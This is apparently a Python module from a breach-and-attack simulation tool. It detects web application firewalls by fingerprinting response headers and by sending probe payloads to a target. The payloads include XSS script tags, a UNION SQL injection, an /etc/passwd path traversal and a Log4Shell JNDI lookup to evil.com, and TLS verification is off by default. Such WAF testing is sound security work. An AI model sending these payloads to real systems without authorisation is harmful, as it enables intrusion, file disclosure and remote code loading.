import aiohttp
import asyncio
import logging
import urllib.parse

from urllib.parse import urlparse

from .base import BaseAttackModule
from bas_engine.models.simulation import Severity

logger = logging.getLogger("secureforge.waf_detection")


# =========================================================
# FAST MODE CONFIG
# =========================================================

FAST_MODE = True

MAX_REQUESTS = 60

DELAY_BETWEEN = 0.08

WAF_BLOCK_CODES = [
    403,
    406,
    429
]

WAF_SIGNATURES = [
    "cloudflare",
    "attention required! | cloudflare",
    "x-amz-cf-id",
    "aws waf captcha",
    "request blocked",
    "the request could not be satisfied",
    "access denied",
    "imperva incapsula",
    "akamai",
    "f5 networks",
    "palo alto networks",
    "fortinet",
    "sucuri webSite firewall",
    "mod_security",
    "waf block page",
]

# =========================================================
# PARAMETERS
# =========================================================

PARAMETERS = [
    "q",
    "search",
    "id",
]

# =========================================================
# COMMON PATHS
# =========================================================

COMMON_PATHS = [

    "/",
    "/login",
    "/search",
    "/admin",
]

# =========================================================
# PAYLOADS
# =========================================================

PAYLOADS = [

    (
        "XSS_PLAIN",
        "<script>alert(1)</script>",
        "941100",
        "XSS"
    ),

    (
        "XSS_DOUBLE",
        "%253Cscript%253Ealert(1)%253C/script%253E",
        "941100",
        "XSS_DOUBLE"
    ),

    (
        "SQLI_UNION",
        "' UNION SELECT NULL,NULL--",
        "942200",
        "SQLI"
    ),

    (
        "PATH_TRAVERSAL",
        "../../../../etc/passwd",
        "930100",
        "TRAVERSAL"
    ),

    (
        "LOG4SHELL",
        "${jndi:ldap://evil.com/x}",
        "932130",
        "LOG4SHELL"
    ),
]


# =========================================================
# MODULE
# =========================================================

class WAFDetectionModule(BaseAttackModule):

    MODULE_NAME = "waf_detection"

    DESCRIPTION = (
        "Fast adaptive WAF intelligence engine"
    )

    MITRE_TACTIC = "Initial Access"

    MITRE_IDS = ["T1190"]


    # =====================================================
    # URL GENERATION
    # =====================================================

    def build_target_urls(self, target: str):

        parsed = urlparse(target)

        base = f"{parsed.scheme}://{parsed.netloc}"

        urls = []

        for path in COMMON_PATHS:

            urls.append(base + path)

        return urls


    # =====================================================
    # HEADER CLASSIFICATION
    # =====================================================

    def classify_headers(self, headers):

        headers = {
            k.lower(): v
            for k, v in headers.items()
        }

        result = {

            "proxy_detected": False,
            "waf_detected": False,
            "vendor": None,
            "type": None,
        }

        # -------------------------------------------------
        # CLOUDFLARE
        # -------------------------------------------------

        if "cf-ray" in headers:

            result["proxy_detected"] = True
            result["waf_detected"] = True
            result["vendor"] = "Cloudflare"
            result["type"] = "CDN/WAF"

        # -------------------------------------------------
        # AWS WAF
        # -------------------------------------------------

        elif "x-amzn-requestid" in headers:

            result["waf_detected"] = True
            result["vendor"] = "AWS WAF"
            result["type"] = "WAF"

        # -------------------------------------------------
        # IMPERVA
        # -------------------------------------------------

        elif "x-iinfo" in headers:

            result["waf_detected"] = True
            result["vendor"] = "Imperva"
            result["type"] = "WAF"

        # -------------------------------------------------
        # FASTLY
        # -------------------------------------------------

        elif "x-served-by" in headers:

            result["proxy_detected"] = True
            result["vendor"] = "Fastly"
            result["type"] = "CDN"

        # -------------------------------------------------
        # SERVER DETECTION
        # -------------------------------------------------

        server = headers.get(
            "server",
            ""
        ).lower()

        # Fix: nginx/apache are web servers, not WAF proxies — don't inflate WAF confidence
        # Only flag actual reverse proxy/CDN headers, not server software
        if "nginx" in server or "apache" in server:
            # Record server type for informational purposes only
            if not result["type"]:
                result["type"] = "Web Server"
            # Do NOT set proxy_detected=True for standard web servers

        return result


    # =====================================================
    # BASELINE ANALYSIS
    # =====================================================

    async def baseline_analysis(
        self,
        session
        ,
        target: str,
    ):

        analysis = {

            "reachable": False,
            "baseline_allowed": False,
            "baseline_status": None,
            "headers": {},
            "classification": {},
            "baseline_length": 0,
        }

        try:

            async with session.get(

                target,

                ssl=self.options.get("ssl_verify", False),

                timeout=6,

                allow_redirects=True

            ) as response:

                analysis["reachable"] = True

                analysis["baseline_status"] = response.status

                analysis["headers"] = dict(
                    response.headers
                )

                if response.status < 400:

                    analysis["baseline_allowed"] = True
                
                body = await response.text(errors="replace")
                analysis["baseline_length"] = len(body)

                analysis["classification"] = (
                    self.classify_headers(
                        response.headers
                    )
                )

        except Exception as e:

            analysis["error"] = str(e)

        return analysis


    # =====================================================
    # SEND PAYLOAD
    # =====================================================

    async def send_payload(

        self,

        session,

        base_url,

        parameter,

        label,

        payload,

        expected_rule,

        category,
    ):

        encoded = urllib.parse.quote(
            payload,
            safe="%"
        )

        url = (
            f"{base_url}"
            f"?{parameter}={encoded}"
        )
        await self.emit_event("INFO", f"[WAF] Sending {category} probe to {url}")

        result = {

            "label": label,
            "payload": payload,
            "category": category,
            "url": url,
            "expected_rule": expected_rule,
        }

        try:

            async with session.get(

                url,

                ssl=self.options.get("ssl_verify", False),

                allow_redirects=False,

                timeout=6

            ) as response:

                result["status"] = response.status

                result["headers"] = dict(
                    response.headers
                )

                # -----------------------------------------
                # BLOCKED
                # -----------------------------------------

                if response.status in WAF_BLOCK_CODES:

                    result["blocked"] = True

                    result["outcome"] = "BLOCKED"

                # -----------------------------------------
                # ALLOWED
                # -----------------------------------------

                else:
                    body = await response.text(errors="replace")
                    body_lower = body.lower()
                    
                    # Signature based check
                    sig_match = any(sig in body_lower for sig in WAF_SIGNATURES)
                    
                    # Length heuristic check
                    # If baseline is known, and body is <10% of baseline AND contains generic block words
                    baseline_len = self.baseline.get("baseline_length", 0) if hasattr(self, "baseline") else 0
                    length_match = False
                    if baseline_len > 1000 and len(body) < (baseline_len * 0.1):
                        if any(w in body_lower for w in ["blocked", "forbidden", "denied", "rejected"]):
                            length_match = True

                    if sig_match or length_match:
                        result["blocked"] = True
                        result["outcome"] = "BLOCKED (Page Signature/Length)"
                    else:
                        result["blocked"] = False
                        result["outcome"] = "ALLOWED"

        except asyncio.TimeoutError:

            result["status"] = "TIMEOUT"

            result["blocked"] = False

            result["outcome"] = "TIMEOUT"

        except Exception as e:

            result["status"] = "ERROR"

            result["blocked"] = False

            result["outcome"] = str(e)

        return result


    # =====================================================
    # MAIN EXECUTION
    # =====================================================

    async def execute(self):
        resolved = await self.resolve_target()

        target = self.build_target_url(resolved, default_scheme="http")

        findings = []

        attack_results = []

        request_count = 0

        stop_scan = False

        path_block_counter = {}

        import ssl
        ssl_verify = self.options.get("ssl_verify", False)
        if not ssl_verify:
            self.logger.warning("⚠️ SSL Verification is disabled for WAF Detection")
        ssl_ctx = ssl.create_default_context()
        if not ssl_verify:
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE

        connector = aiohttp.TCPConnector(
            ssl=ssl_ctx
        )

        async with aiohttp.ClientSession(

            connector=connector

        ) as session:

            # =================================================
            # BASELINE ANALYSIS
            # =================================================

            baseline = await self.baseline_analysis(
                session,
                target,
            )
            self.baseline = baseline

            print(
                "\n=== BASELINE ANALYSIS ==="
            )

            print(baseline)

            # =================================================
            # EARLY EXIT IF DEAD TARGET
            # =================================================

            if not baseline.get("reachable"):

                findings.append(

                    self.finding(

                        title="Target Unreachable",

                        description=(
                            f"Could not reach "
                            f"{target}"
                        ),

                        severity=Severity.MEDIUM,

                        mitre_id="T1190",

                        raw_data=baseline,
                    )
                )

                return findings

            # =================================================
            # URLS
            # =================================================

            urls = self.build_target_urls(target)

            # =================================================
            # ATTACK LOOP
            # =================================================

            for base_url in urls:

                if stop_scan:
                    break

                # Fix: initialise the counter BEFORE the inner loop,
                # and only reset it when moving to a new base_url
                if base_url not in path_block_counter:
                    path_block_counter[base_url] = 0

                # Skip heavily protected paths (counter now correctly accumulates)
                if path_block_counter[base_url] >= 10:

                    logger.debug(
                        f"Skipping protected path: {base_url}"
                    )

                    continue

                for parameter in PARAMETERS:

                    if stop_scan:
                        break

                    for (

                        label,
                        payload,
                        expected_rule,
                        category

                    ) in PAYLOADS:

                        if stop_scan:
                            break

                        # -------------------------------------
                        # MAX LIMIT
                        # -------------------------------------

                        if request_count >= MAX_REQUESTS:

                            print(
                                "\n[!] MAX REQUEST "
                                "LIMIT REACHED"
                            )

                            stop_scan = True

                            break

                        result = await self.send_payload(

                            session,

                            base_url,

                            parameter,

                            label,

                            payload,

                            expected_rule,

                            category
                        )

                        request_count += 1

                        attack_results.append(
                            result
                        )

                        # -------------------------------------
                        # PATH BLOCK TRACKING
                        # -------------------------------------

                        if result.get("blocked"):

                            path_block_counter[
                                base_url
                            ] += 1

                        print(
                            f"[+] Probe: "

                            f"{category} "

                            f"{result['status']} "

                            f"{base_url}"
                        )

                        await self.emit_event(
                            "INFO",
                            f"[WAF TEST] {category}: HTTP {result['status']} (Blocked: {result.get('blocked', False)})"
                        )

                        # -------------------------------------
                        # HIGH CONFIDENCE STOP
                        # -------------------------------------

                        blocked_now = len([

                            r for r in attack_results
                            if r.get("blocked")
                        ])

                        allowed_now = len([

                            r for r in attack_results
                            if r.get("blocked") is False
                        ])

                        if blocked_now >= 20 \
                        and allowed_now <= 2:

                            print(
                                "\n[!] HIGH "
                                "CONFIDENCE WAF "
                                "DETECTED"
                            )

                            stop_scan = True

                            break

                        await asyncio.sleep(
                            DELAY_BETWEEN
                        )

        # =====================================================
        # ANALYSIS
        # =====================================================

        blocked = len([

            r for r in attack_results
            if r.get("blocked")
        ])

        bypassed = len([

            r for r in attack_results
            if r.get("blocked") is False
        ])

        total = len(attack_results)

        confidence = 0

        waf_detected = False

        if total > 0:

            ratio = blocked / total

            confidence = int(
                ratio * 100
            )

            # Fix: raise WAF detection threshold to 50% to reduce false positives
            # from application-level 403s that are not WAF blocks
            if ratio > 0.50:

                waf_detected = True

        classification = baseline.get(
            "classification",
            {}
        )

        # =====================================================
        # RISK SCORING
        # =====================================================

        if bypassed > blocked:

            risk = "high"

        elif blocked > bypassed:

            risk = "low"

        else:

            risk = "medium"

        # =====================================================
        # NORMALIZATION DEPTH
        # =====================================================

        normalization_depth = "none"

        double_encoded_blocked = any(

            r["label"] == "XSS_DOUBLE"
            and r.get("blocked")

            for r in attack_results
        )

        if double_encoded_blocked:

            normalization_depth = (
                "double_url_encoded"
            )

        # =====================================================
        # FINAL INTELLIGENCE OBJECT
        # =====================================================

        intelligence = {

                "target":
                    target,

            "reachable":
                baseline.get(
                    "reachable"
                ),

            "proxy_detected":
                classification.get(
                    "proxy_detected"
                ),

            "waf_detected":
                waf_detected
                or classification.get(
                    "waf_detected"
                ),

            "waf_vendor":
                classification.get(
                    "vendor"
                ),

            "infrastructure_type":
                classification.get(
                    "type"
                ),

            "confidence":
                confidence,

            "baseline_behavior":
                (
                    "allowed"
                    if baseline.get(
                        "baseline_allowed"
                    )
                    else "blocked"
                ),

            "payloads_tested":
                total,

            "blocked":
                blocked,

            "bypassed":
                bypassed,

            "normalization_depth":
                normalization_depth,

            "risk_level":
                risk,
        }

        print(
            "\n=== ATTACK SURFACE "
            "INTELLIGENCE ==="
        )

        print(intelligence)

        # =====================================================
        # MAIN FINDING
        # =====================================================

        findings.append(

            self.finding(

                title=(
                    "Adaptive WAF "
                    "Intelligence Analysis"
                ),

                description=(

                    f"WAF="
                    f"{intelligence['waf_detected']} "

                    f"Vendor="
                    f"{intelligence['waf_vendor']} "

                    f"Blocked="
                    f"{blocked}/{total} "

                    f"Confidence="
                    f"{confidence}% "

                    f"Risk="
                    f"{risk}"
                ),

                severity=(

                    Severity.LOW

                    if blocked > bypassed

                    else Severity.HIGH
                ),

                mitre_id="T1190",

                raw_data=intelligence,
            )
        )

        return findings
